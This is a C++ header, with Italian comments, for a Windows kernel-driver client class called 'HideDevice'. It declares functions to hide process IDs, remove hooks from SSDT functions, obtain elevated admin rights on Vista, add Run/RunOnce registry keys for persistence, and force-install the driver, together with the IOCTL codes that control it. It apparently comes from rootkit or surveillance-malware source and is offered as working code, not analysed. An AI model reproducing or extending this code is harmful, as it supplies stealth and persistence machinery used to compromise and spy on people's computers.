#define PREAMBLE_SIZE 10

#pragma pack(1)
typedef struct fixup_entry {
	DWORD func_addr;
	unsigned char func_preamble[PREAMBLE_SIZE];
} fu_entry;
typedef struct UnHookEntry {
	unsigned int index;
	fu_entry fix_up;
} UHE;
typedef struct AddPidEntry {
	DWORD PID;
	DWORD is_add;
} APE;
typedef struct registry_entry {
	DWORD is_deleting;
	WCHAR key_name[256];
	WCHAR value_name[50];
	WCHAR value[1024];
} REE;
#pragma pack()

class HideDevice
{
	public:
	void HideDevice::unhook_close();		// Chiude il device di unhook
	BOOL HideDevice::unhook_all(BOOL is_fixup);				// Unhooka tutte le funzioni hookate
	BOOL HideDevice::unhook_func(char *func_name, BOOL is_fixup);	// Unhooka una funzione particolare
	BOOL HideDevice::unhook_hidepid(DWORD PID, BOOL is_add);	// Aggiunge/toglie un pid alla lista di quelli da nascondere
	BOOL HideDevice::unhook_getadmin();		// Su vista rende admin "figo" (non usare su XP)
	BOOL HideDevice::unhook_isdrv(WCHAR *driver_name);		// Dice se c'e' il driver che gira
	BOOL HideDevice::unhook_getpath(WCHAR *driver_name, WCHAR *driver_path, DWORD size);	// Torna il path del driver
	BOOL HideDevice::unhook_isdev();						// Dice se c'e' il device di unhooking
	BOOL HideDevice::unhook_regwriteW(WCHAR *value_name, WCHAR *value);	// Inserisce una chiave in Run/RunOnce
	BOOL HideDevice::unhook_regdeleteW(WCHAR *value_name);				// Cancella una chiave da Run/RunOnce
	BOOL HideDevice::unhook_regwriteA(char *value_name, char *value);	// Inserisce una chiave in Run/RunOnce
	BOOL HideDevice::unhook_regdeleteA(char *value_name);				// Cancella una chiave da Run/RunOnce
	BOOL HideDevice::unhook_uninstall();								// Rimuove il driver dal registry
	BOOL HideDevice::df_thaw(WCHAR freezed, WCHAR *thawed);				// Monta un device "reale"
	BOOL HideDevice::df_freeze();										// Smonta un device "reale"


	HideDevice(void);
	HideDevice(WCHAR *driver_path); // Installa anche il driver (il forcing funziona solo su XP)
	~HideDevice(void);
	
	private:
	BOOL HideDevice::unhook_init();
	#define NUM_OF_SERVICES 0x300
	fu_entry SDT_Table[NUM_OF_SERVICES];
	DWORD	sdt_entry_count;
	HANDLE	hFile;
	BOOL	sdt_init;
};


#ifndef CTL_CODE
	#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
	((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
	)
#endif
#ifndef METHOD_BUFFERED
	#define METHOD_BUFFERED	0
#endif
#ifndef FILE_WRITE_ACCESS
	#define FILE_WRITE_ACCESS ( 0x0002 )
#endif

#define FILE_DEVICE_H4DRIVER 0x00008234

#define ADMIN_FUNCTION 	0x0882
#define UNHOOK_FUNCTION 0x0883
#define ADDPID_FUNCTION 0x0884
#define REG_FUNCTION	0x0885
#define THAW_FUNCTION	0x0886
#define FREEZE_FUNCTION 0x0887
#define UNINSTALL_FUNCTION  0x0888

#define IOCTL_UNHOOK CTL_CODE(FILE_DEVICE_H4DRIVER, UNHOOK_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS) // 0x8234A20C
#define IOCTL_ADDPID CTL_CODE(FILE_DEVICE_H4DRIVER, ADDPID_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS) // 0x8234A210
#define IOCTL_ADMIN  CTL_CODE(FILE_DEVICE_H4DRIVER, ADMIN_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS)  // 0x8234A208
#define IOCTL_REG 	 CTL_CODE(FILE_DEVICE_H4DRIVER, REG_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS)    // 0x8234A214
#define IOCTL_THAW   CTL_CODE(FILE_DEVICE_H4DRIVER, THAW_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS)   
#define IOCTL_FREEZE CTL_CODE(FILE_DEVICE_H4DRIVER, FREEZE_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS) 
#define IOCTL_UNINST CTL_CODE(FILE_DEVICE_H4DRIVER, UNINSTALL_FUNCTION, METHOD_BUFFERED, FILE_WRITE_ACCESS) 

